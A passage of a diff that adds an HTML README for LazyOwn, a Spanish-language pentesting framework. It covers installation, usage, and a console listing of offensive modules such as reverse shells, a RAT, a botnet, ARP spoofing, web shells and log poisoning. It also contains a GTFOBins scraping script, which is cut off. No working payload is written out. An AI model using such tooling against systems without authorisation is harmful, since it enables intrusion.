@@ -1,0 +1,2114 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>README</title>
+  <style>
+    html {
+      color: #1a1a1a;
+      background-color: #fdfdfd;
+    }
+    body {
+      margin: 0 auto;
+      max-width: 36em;
+      padding-left: 50px;
+      padding-right: 50px;
+      padding-top: 50px;
+      padding-bottom: 50px;
+      hyphens: auto;
+      overflow-wrap: break-word;
+      text-rendering: optimizeLegibility;
+      font-kerning: normal;
+    }
+    @media (max-width: 600px) {
+      body {
+        font-size: 0.9em;
+        padding: 12px;
+      }
+      h1 {
+        font-size: 1.8em;
+      }
+    }
+    @media print {
+      html {
+        background-color: white;
+      }
+      body {
+        background-color: transparent;
+        color: black;
+        font-size: 12pt;
+      }
+      p, h2, h3 {
+        orphans: 3;
+        widows: 3;
+      }
+      h2, h3, h4 {
+        page-break-after: avoid;
+      }
+    }
+    p {
+      margin: 1em 0;
+    }
+    a {
+      color: #1a1a1a;
+    }
+    a:visited {
+      color: #1a1a1a;
+    }
+    img {
+      max-width: 100%;
+    }
+    svg {
+      height: auto;
+      max-width: 100%;
+    }
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.4em;
+    }
+    h5, h6 {
+      font-size: 1em;
+      font-style: italic;
+    }
+    h6 {
+      font-weight: normal;
+    }
+    ol, ul {
+      padding-left: 1.7em;
+      margin-top: 1em;
+    }
+    li > ol, li > ul {
+      margin-top: 0;
+    }
+    blockquote {
+      margin: 1em 0 1em 1.7em;
+      padding-left: 1em;
+      border-left: 2px solid #e6e6e6;
+      color: #606060;
+    }
+    code {
+      font-family: Menlo, Monaco, Consolas, 'Lucida Console', monospace;
+      font-size: 85%;
+      margin: 0;
+      hyphens: manual;
+    }
+    pre {
+      margin: 1em 0;
+      overflow: auto;
+    }
+    pre code {
+      padding: 0;
+      overflow: visible;
+      overflow-wrap: normal;
+    }
+    .sourceCode {
+     background-color: transparent;
+     overflow: visible;
+    }
+    hr {
+      background-color: #1a1a1a;
+      border: none;
+      height: 1px;
+      margin: 1em 0;
+    }
+    table {
+      margin: 1em 0;
+      border-collapse: collapse;
+      width: 100%;
+      overflow-x: auto;
+      display: block;
+      font-variant-numeric: lining-nums tabular-nums;
+    }
+    table caption {
+      margin-bottom: 0.75em;
+    }
+    tbody {
+      margin-top: 0.5em;
+      border-top: 1px solid #1a1a1a;
+      border-bottom: 1px solid #1a1a1a;
+    }
+    th {
+      border-top: 1px solid #1a1a1a;
+      padding: 0.25em 0.5em 0.25em 0.5em;
+    }
+    td {
+      padding: 0.125em 0.5em 0.25em 0.5em;
+    }
+    header {
+      margin-bottom: 4em;
+      text-align: center;
+    }
+    #TOC li {
+      list-style: none;
+    }
+    #TOC ul {
+      padding-left: 1.3em;
+    }
+    #TOC > ul {
+      padding-left: 0;
+    }
+    #TOC a:not(:hover) {
+      text-decoration: none;
+    }
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    div.columns{display: flex; gap: min(4vw, 1.5em);}
+    div.column{flex: auto; overflow-x: auto;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    /* The extra [class] is a hack that increases specificity enough to
+       override a similar rule in reveal.js */
+    ul.task-list[class]{list-style: none;}
+    ul.task-list li input[type="checkbox"] {
+      font-size: inherit;
+      width: 0.8em;
+      margin: 0 0.8em 0.2em -1.6em;
+      vertical-align: middle;
+    }
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+    /* CSS for syntax highlighting */
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    .sourceCode { overflow: visible; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { display: inline-block; text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      {   }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+    code span.at { color: #7d9029; } /* Attribute */
+    code span.bn { color: #40a070; } /* BaseN */
+    code span.bu { color: #008000; } /* BuiltIn */
+    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #4070a0; } /* Char */
+    code span.cn { color: #880000; } /* Constant */
+    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+    code span.dt { color: #902000; } /* DataType */
+    code span.dv { color: #40a070; } /* DecVal */
+    code span.er { color: #ff0000; font-weight: bold; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #40a070; } /* Float */
+    code span.fu { color: #06287e; } /* Function */
+    code span.im { color: #008000; font-weight: bold; } /* Import */
+    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+    code span.op { color: #666666; } /* Operator */
+    code span.ot { color: #007020; } /* Other */
+    code span.pp { color: #bc7a00; } /* Preprocessor */
+    code span.sc { color: #4070a0; } /* SpecialChar */
+    code span.ss { color: #bb6688; } /* SpecialString */
+    code span.st { color: #4070a0; } /* String */
+    code span.va { color: #19177c; } /* Variable */
+    code span.vs { color: #4070a0; } /* VerbatimString */
+    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+  </style>
+</head>
+<body>
+<h1 id="lazyown">LazyOwn</h1>
+<p><img
+src="https://img.shields.io/badge/python-3670A0?style=for-the-badge&amp;logo=python&amp;logoColor=ffdd54"
+alt="Python" /> <img
+src="https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&amp;logo=gnu-bash&amp;logoColor=white"
+alt="Shell Script" /> <img
+src="https://github.com/user-attachments/assets/961783c2-cd57-4cc2-ab4c-53fde581db79"
+alt="image" /> <img
+src="https://github.com/user-attachments/assets/79052f87-f87c-4b32-a4a2-854113ca3a4c"
+alt="image" /> <a href="https://www.gnu.org/licenses/gpl-3.0"><img
+src="https://img.shields.io/badge/License-GPLv3-blue.svg"
+alt="License: GPL v3" /></a> <img
+src="https://github.com/user-attachments/assets/b69f1d31-c075-4713-a44e-a40a034a7407"
+alt="image" /> <img
+src="https://github.com/user-attachments/assets/df82a669-be0c-4a03-bd98-842a67baaef6"
+alt="image" /></p>
+<p><img src="#lazyown"
+alt="lazyown" />(https://github.com/user-attachments/assets/73097914-3af9-4b8f-8824-ed599dfc7e38</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">██╗</span>      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">██║</span>     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">██║</span>     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">██║</span>     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="ex">███████╗██║</span>  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">╚══════╝╚═╝</span>  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝</span></code></pre></div>
+<p><a href="https://ko-fi.com/Y8Y2Z73AV"><img
+src="https://ko-fi.com/img/githubbutton_sm.svg" alt="ko-fi" /></a></p>
+<figure>
+<img
+src="https://github.com/user-attachments/assets/1debaed0-8f84-4079-ad2f-48cc4cfd9d95"
+alt="LazyOwn1" />
+<figcaption aria-hidden="true">LazyOwn1</figcaption>
+</figure>
+<p>LazyOwn Framework es un potente y versátil framework de seguridad
+diseñado para automatizar y simplificar tareas de pentesting y análisis
+de vulnerabilidades. Este entorno interactivo combina múltiples
+herramientas y scripts, facilitando el trabajo de los profesionales de
+la ciberseguridad en diversas fases del ciclo de evaluación de
+seguridad. Con una interfaz de línea de comandos intuitiva, LazyOwn
+permite a los usuarios configurar parámetros específicos, ejecutar
+scripts personalizados y obtener resultados en tiempo real, todo desde
+una única plataforma.</p>
+<p>Características Principales Interfaz Interactiva:</p>
+<p>Shell interactiva con comandos fáciles de usar para configurar y
+ejecutar scripts. Capacidad para mostrar y ajustar parámetros
+personalizados que se aplican a diferentes scripts. Automatización de
+Tareas:</p>
+<p>Automatiza tareas comunes de pentesting, como escaneo de
+vulnerabilidades, fuzzing de aplicaciones web, ataques de fuerza bruta y
+más. Integración con herramientas populares y scripts personalizados
+para una cobertura completa de pruebas en Parrot Sec. <img
+src="https://github.com/user-attachments/assets/3234450f-dd5e-40e2-bcd8-f209ab0c4665"
+alt="image" /></p>
+<p>Visualización en tiempo real de la salida de los scripts, permitiendo
+a los usuarios ver los resultados instantáneamente y reaccionar
+rápidamente. Modularidad y Extensibilidad:</p>
+<p>Diseñado para ser extensible, permitiendo a los usuarios añadir y
+personalizar scripts fácilmente. Soporte para múltiples lenguajes de
+scripting, incluyendo Python y Bash. Configuración Flexible:</p>
+<p>Posibilidad de establecer parámetros específicos como direcciones IP,
+claves API, métodos HTTP, datos de solicitud, y más, proporcionando un
+control total sobre los scripts ejecutados. Uso Típico Configuración de
+Parámetros:</p>
+<p>Los usuarios pueden establecer parámetros necesarios usando comandos
+set, como set target_ip 192.168.1.1 para definir la IP del objetivo.
+Ejecución de Scripts:</p>
+<p>Ejecución de scripts predefinidos para realizar diversas tareas, por
+ejemplo, run lazygptcli para interactuar con GPT usando un prompt y una
+clave API configurados. Visualización de Resultados:</p>
+<p>Los resultados de los scripts se muestran en la consola en tiempo
+real, proporcionando feedback inmediato sobre el progreso y los
+hallazgos.</p>
+<p>LazyOwn es un proyecto que partio diseñado para automatizar la
+búsqueda y análisis de binarios con permisos especiales en sistemas
+Linux y Windows. El proyecto consta de tres scripts principales que
+extraen información de <a
+href="https://gtfobins.github.io/">GTFOBins</a>, analizan los binarios
+en el sistema y generan opciones basadas en la información
+recopilada.</p>
+<p><a href="https://www.reddit.com/r/LazyOwn/"
+class="uri">https://www.reddit.com/r/LazyOwn/</a></p>
+<p>Revolutionize Your Pentesting with LazyOwn: Automate Binary Analysis
+on Linux and Windows</p>
+<p><a
+href="https://github.com/grisuno/LazyOwn/assets/1097185/eec9dbcc-88cb-4e47-924d-6dce2d42f79a"
+class="uri">https://github.com/grisuno/LazyOwn/assets/1097185/eec9dbcc-88cb-4e47-924d-6dce2d42f79a</a></p>
+<p>Discover LazyOwn, the ultimate solution for automating the search and
+analysis of binaries with special permissions on both Linux and Windows
+systems. Our powerful tool simplifies pentesting, making it more
+efficient and effective. Watch this video to learn how LazyOwn can
+streamline your security assessments and enhance your cybersecurity
+toolkit.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> set target_ip 192.168.1.1</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[SET]</span> target_ip set to 192.168.1.1</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> run lazynmap</span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[INFO]</span> Running Nmap scan on 192.168.1.1</span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span></code></pre></div>
+<figure>
+<img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/9f30a1a3-dfe8-4cc1-9bd7-76c21bdc64b7"
+alt="image" />
+<figcaption aria-hidden="true">image</figcaption>
+</figure>
+<p>LazyOwn es ideal para profesionales de la ciberseguridad que buscan
+una solución centralizada y automatizada para sus necesidades de
+pentesting, ahorrando tiempo y mejorando la eficiencia en la
+identificación y explotación de vulnerabilidades.</p>
+<figure>
+<img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/9a348e76-d667-4526-bdef-863159ba452d"
+alt="Captura de pantalla 2024-05-22 021136" />
+<figcaption aria-hidden="true">Captura de pantalla 2024-05-22
+021136</figcaption>
+</figure>
+<h2 id="requisitos">Requisitos</h2>
+<ul>
+<li>Python 3.x</li>
+<li>Módulos de Python:
+<ul>
+<li>python-libnmap</li>
+<li>pwn</li>
+<li>groq</li>
+<li>PyPDF2</li>
+<li>docx</li>
+<li>python-docx</li>
+<li>olefile</li>
+<li>exifread</li>
+<li>pycryptodome</li>
+<li>impacket</li>
+<li>pandas</li>
+<li>colorama</li>
+<li>tabulate</li>
+<li>pyarrow</li>
+<li>keyboard</li>
+<li>flask-unsign</li>
+<li>name-that-hash</li>
+</ul></li>
+<li><code>subprocess</code> (incluido en la biblioteca estándar de
+Python)</li>
+<li><code>platform</code> (incluido en la biblioteca estándar de
+Python)</li>
+<li><code>tkinter</code> (Opcional para el GUI)</li>
+<li><code>numpy</code> (Opcional para el GUI)</li>
+<li></li>
+</ul>
+<h2 id="instalación">Instalación</h2>
+<ol type="1">
+<li>Clona el repositorio:</li>
+</ol>
+<div class="sourceCode" id="cb3"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/grisuno/LazyOwn.git</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> LazyOwn</span></code></pre></div>
+<ol start="2" type="1">
+<li>Instala las dependencias de Python:</li>
+</ol>
+<div class="sourceCode" id="cb4"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./install.sh</span></span></code></pre></div>
+<h2 id="uso">Uso</h2>
+<div class="sourceCode" id="cb5"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./run</span> or ./fast_run_as_r00t.sh </span></code></pre></div>
+<pre><code>Use set &lt;parameter&gt; &lt;value&gt; to set parameters.
+Use show to display current parameter values.
+Use run &lt;script_name&gt; to execute a script with the set parameters.
+Use exit to exit the CLI.
+Una vez que el shell esté en funcionamiento, puedes utilizar los siguientes comandos:
+
+list: Lista todos los Modulos de LazyOwn
+set &lt;parámetro&gt; &lt;valor&gt;: Establece el valor de un parámetro. Por ejemplo, set target_ip 192.168.1.1.
+show: Muestra los valores actuales de todos los parámetros.
+run &lt;script&gt;: Ejecuta un script específico disponible en el framework.
+Scripts disponibles
+
+LazyOwn&gt; ls
+    [+] Available scripts to run: [👽]
+lazysearch                lazysearch_gui            lazyown
+update_db                 lazynmap                  lazyaslrcheck
+lazynmapdiscovery         lazygptcli                lazyburpfuzzer
+lazymetaextract0r         lazyreverse_shell         lazyattack
+lazyownratcli             lazyownrat                lazygath
+lazysniff                 lazynetbios               lazybotnet
+lazybotcli                lazyhoneypot              lazysearch_bot
+lazylfi2rce               lazylogpoisoning          lazymsfvenom
+lazypathhijacking         lazyarpspoofing           lazyftpsniff
+lazyssh77enum             lazywerkzeugdebug
+LazyOwn&gt; ?
+
+Documented commands (type help &lt;topic&gt;):
+========================================
+acknowledgearp     dirsearch           lazywebshell     rpcdump
+acknowledgeicmp    dnsenum             ldapdomaindump   rubeus
+addhosts           dnsmap              list             run
+alias              download_exploit    msf              samrdump
+arpscan            download_resources  nbtscan          set
+asprevbase64       encrypt             nc               sh
+banner             enum4linux          nikto            show
+bloodhound         exit                nmapscripthelp   smbclient
+chisel             fixel               openssl_sclient  smbmap
+clean              fixperm             payload          smbserver
+clock              getcap              ping             snmpcheck
+cme                getnpusers          ports            socat
+conptyshell        getseclist          proxy            sqlmap
+cp                 gobuster            psexec           ss
+cports             gospider            pwd              sshd
+createcredentials  hashcat             py3ttyup         tcpdump_icmp
+createhash         help                pyautomate       vpn
+createrevshell     ignorearp           qa               wfuzz
+createwebshell     ignoreicmp          responder        whatweb
+createwinrevshell  ip                  rev              winbase64payload
+decrypt            john2hash           rhost            wrapper
+dig                lazypwn             rpcclient        www
+
+
+</code></pre>
+<h2 id="tag-en-youtube">Tag en youtube</h2>
+<p><a href="https://www.youtube.com/hashtag/lazyown"
+class="uri">https://www.youtube.com/hashtag/lazyown</a></p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> set binary_name my_binary</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> set target_ip 192.168.1.100</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> set api_key my_api_key</span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> run lazysearch</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> run lazynmap</span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="ex">LazyOwn</span><span class="op">&gt;</span> exit</span></code></pre></div>
+<figure>
+<img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/6c8a0b35-cde5-42b3-be73-eb45b3f821f0"
+alt="image" />
+<figcaption aria-hidden="true">image</figcaption>
+</figure>
+<p>para las busquedas</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> lazysearch.py binario_a_buscar</span></code></pre></div>
+<h2 id="busquedas-con-gui">Busquedas con GUI</h2>
+<p>Características adicionales y cambios: AutocompleteEntry:</p>
+<p>Se ha agregado un filtro para eliminar valores None de la lista de
+autocompletar. Nuevo Vector de Ataque:</p>
+<p>Añadido un botón “Nuevo Vector de Ataque” en la interfaz principal.
+Implementada la funcionalidad para agregar un nuevo vector de ataque y
+guardar los datos actualizados en los archivos Parquet. Exportar a
+CSV:</p>
+<p>Añadido un botón “Exportar a CSV” en la interfaz principal.
+Implementada la funcionalidad para exportar los datos del DataFrame a un
+archivo CSV seleccionado por el usuario. Uso: Agregar un nuevo vector de
+ataque: Hacer clic en el botón “Nuevo Vector de Ataque”, llenar los
+campos y guardar. Exportar a CSV: Hacer clic en el botón “Exportar a
+CSV” y seleccionar la ubicación para guardar el archivo CSV.</p>
+<p>Nueva Función scan_system_for_binaries:</p>
+<p>Implementa la búsqueda de binarios en el sistema utilizando el
+comando file para determinar si un archivo es binario. Se utiliza
+os.walk para recorrer el sistema de archivos. Los resultados se muestran
+en una nueva ventana de la GUI. Botón para Buscar Binarios:</p>
+<p>Se ha añadido un botón “Buscar Binarios en el Sistema” en la interfaz
+principal que llama a la función scan_system_for_binaries. Nota: La
+función is_binary utiliza el comando file de Unix para determinar si un
+archivo es un ejecutable binario. Si estás en un sistema operativo
+diferente, necesitarás ajustar este método para que sea compatible. Esta
+implementación puede ser intensiva en recursos, ya que recorre todo el
+sistema de archivos. Podrías añadir opciones adicionales para limitar la
+búsqueda a directorios específicos o añadir un filtro para ciertos tipos
+de archivos.</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> LazyOwnExplorer.py</span></code></pre></div>
+<figure>
+<img
+src="https://github.com/grisuno/LazyOwn/assets/1097185/87c4be70-66a4-4e84-bdb6-fdfdb89a3f94"
+alt="image" />
+<figcaption aria-hidden="true">image</figcaption>
+</figure>
+<p>para ejecutar una busqueda contra la maquina a analizar</p>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> lazyown.py</span></code></pre></div>
+<p>en el caso de querer actualizar hacemos</p>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode sh"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> LazyOwn</span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="fu">rm</span> <span class="pp">*</span>.csv</span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="fu">rm</span> <span class="pp">*</span>.parquet</span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="ex">./update_db.sh</span></span></code></pre></div>
+<p>El proyecto consta de tres scripts principales:</p>
+<ol type="1">
+<li>search.py Este script extrae información de binarios y sus funciones
+desde GTFOBins y la guarda en un archivo CSV. ya hice el scraping así
+que mejor evitar y usar la db que ya tiene en formato csv, a menos que
+quieran actualizar la db</li>
+</ol>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> bs4 <span class="im">import</span> BeautifulSoup</span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> csv</span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="co"># URL del servidor que contiene el HTML</span></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>url <span class="op">=</span> <span class="st">&quot;https://gtfobins.github.io/index.html&quot;</span></span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="co"># Hacer una solicitud GET al servidor</span></span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>response <span class="op">=</span> requests.get(url)</span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a><span class="co"># Verificar si la solicitud fue exitosa</span></span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> response.status_code <span class="op">==</span> <span class="dv">200</span>:</span>
+<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a>    html_content <span class="op">=</span> response.text</span>
+<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a><span class="cf">else</span>:</span>
+<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">&quot;Error al obtener el HTML del servidor&quot;</span>)</span>
+<span id="cb12-16"><a href="#cb12-16" aria-hidden="true" tabindex="-1"></a>    exit()</span>
+<span id="cb12-17"><a href="#cb12-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-18"><a href="#cb12-18" aria-hidden="true" tabindex="-1"></a><span class="co"># Parsear el contenido HTML con Beautiful Soup</span></span>
+<span id="cb12-19"><a href="#cb12-19" aria-hidden="true" tabindex="-1"></a>soup <span class="op">=</span> BeautifulSoup(html_content, <span class="st">&#39;html.parser&#39;</span>)</span>
+<span id="cb12-20"><a href="#cb12-20" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-21"><a href="#cb12-21" aria-hidden="true" tabindex="-1"></a><span class="co"># Encontrar el contenedor de la tabla</span></span>
+<span id="cb12-22"><a href="#cb12-22" aria-hidden="true" tabindex="-1"></a>table_wrapper <span class="op">=</span> soup.find(<span class="st">&#39;div&#39;</span>, <span class="bu">id</span><span class="op">=</span><span class="st">&#39;bin-table-wrapper&#39;</span>)</span>
+<span id="cb12-23"><a href="#cb12-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-24"><a href="#cb12-24" aria-hidden="true" tabindex="-1"></a><span class="co"># Inicializar una lista para almacenar la información</span></span>
+<span id="cb12-25"><a href="#cb12-25" aria-hidden="true" tabindex="-1"></a>data <span class="op">=</span> []</span>
+<span id="cb12-26"><a href="#cb12-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-27"><a href="#cb12-27" aria-hidden="true" tabindex="-1"></a><span class="co"># Recorrer todas las filas de la tabla</span></span>
+<span id="cb12-28"><a href="#cb12-28" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> row <span class="kw">in</span> table_wrapper.find_all(<span class="st">&#39;tr&#39;</span>):</span>
+<span id="cb12-29"><a href="#cb12-29" aria-hidden="true" tabindex="-1"></a>    bin_name <span class="op">=</span> row.find(<span class="st">&#39;a&#39;</span>, class_<span class="op">=</span><span class="st">&#39;bin-name&#39;</span>)</span>
+<span id="cb12-30"><a href="#cb12-30" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> bin_name:</span>
+<span id="cb12-31"><a href="#cb12-31" aria-hidden="true" tabindex="-1"></a>        bin_name_text <span class="op">=</span> bin_name.text.strip()</span>
+<span id="cb12-32"><a href="#cb12-32" aria-hidden="true" tabindex="-1"></a>        functions <span class="op">=</span> []</span>
+<span id="cb12-33"><a href="#cb12-33" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> func <span class="kw">in</span> row.find_all(<span class="st">&#39;li&#39;</span>):</span>
+<span id="cb12-34"><a href="#cb12-34" aria-hidden="true" tabindex="-1"></a>            function_link <span class="op">=</span> func.find(<span class="st">&#39;a&#39;</span>)</span>
+<span id="cb12-35"><a href="#cb12-35" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> function_link:</span>
+<span id="cb12-36"><a href="#cb12-36" aria-hidden="true" tabindex="-1"></a>                function_href <span class="op">=</span> function_link.get(<span class="st">&#39;href&#39;</span>).strip()</span>
+<span id="cb12-37"><a href="#cb12-37" aria-hidden="true" tabindex="-1"></a>                function_name <span class="op">=</span> function_link.text.strip()</span>
+<span id="cb12-38"><a href="#cb12-38" aria-hidden="true" tabindex="-1"></a>                functions.append({<span class="st">&#39;name&#39;</span>: function_name, <span class="st">&#39;href&#39;</span>: function_href})</span>
+<span id="cb12-39"><a href="#cb12-39" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb12-40"><a href="#cb12-40" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Añadir la información a la lista de datos</span></span>
+<span id="cb12-41"><a href="#cb12-41" aria-hidden="true" tabindex="-1"></a>        data.append({<span class="st">&#39;binary&#39;</span>: bin_name_text, <span class="st">&#39;functions&#39;</span>: functions})</span>
+<span id="cb12-42"><a href="#cb12-42" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-43"><a href="#cb12-43" aria-hidden="true" tabindex="-1"></a><span class="co"># Guardar la información en un archivo CSV</span></span>
+<span id="cb12-44"><a href="#cb12-44" aria-hidden="true" tabindex="-1"></a>csv_file <span class="op">=</span> <span class="st">&quot;bin_data.csv&quot;</span></span>
+<span id="cb12-45"><a href="#cb12-45" aria-hidden="true" tabindex="-1"></a><span class="cf">with</span> <span class="bu">open</span>(csv_file, mode<span class="op">=</span><span class="st">&#39;w&#39;</span>, newline<span class="op">=</span><span class="st">&#39;&#39;</span>) <span class="im">as</span> <span class="bu">file</span>:</span>
+<span id="cb12-46"><a href="#cb12-46" aria-hidden="true" tabindex="-1"></a>    writer <span class="op">=</span> csv.writer(<span class="bu">file</span>)</span>
